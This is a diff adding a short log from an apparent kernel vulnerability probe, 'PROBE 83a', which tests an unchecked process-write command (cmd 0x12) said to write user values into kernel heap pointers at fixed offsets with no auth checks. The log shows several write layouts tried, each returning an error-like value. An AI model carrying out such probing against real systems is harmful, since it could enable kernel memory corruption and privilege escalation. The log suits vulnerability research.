@@ -1,0 +1,21 @@
+=== PROBE 83a: SYS 601 DEEP RETEST (DECOMPILED VULNS) ===
+TEST_SECTION=C
+
+[0] canary pid=166
+
+=== SECTION C: UNCHECKED PROCESS WRITE (cmd 0x12) ===
+[C] Writes user values to proc+0x578 and proc+0x580
+[C] These are kernel heap pointers freed at process teardown
+[C] Zero auth checks — first call always succeeds (one-shot gate)
+
+[C] cmd 0x00 init: ok=true rv=0x0
+[C] cmd 0x01 proc init: ok=true rv=0xffffffffffffffffffffffff
+[C] cmd 0x12 (write test): ok=true rv=0xffffffffffffffffffffffff
+[C] Direct write failed, trying alternative input layouts...
+[C] cmd 0x12 (offset_0x10): ok=true rv=0xffffffffffffffffffffffff
+[C] cmd 0x12 (offset_0x20): ok=true rv=0xffffffffffffffffffffffff
+[C] cmd 0x12 (as_dwords): ok=true rv=0xffffffffffffffffffffffff
+[C] final canary: ok=true pid=166
+
+=== PROBE 83a SECTION C COMPLETE ===
+=== PROBE 83a COMPLETE ===
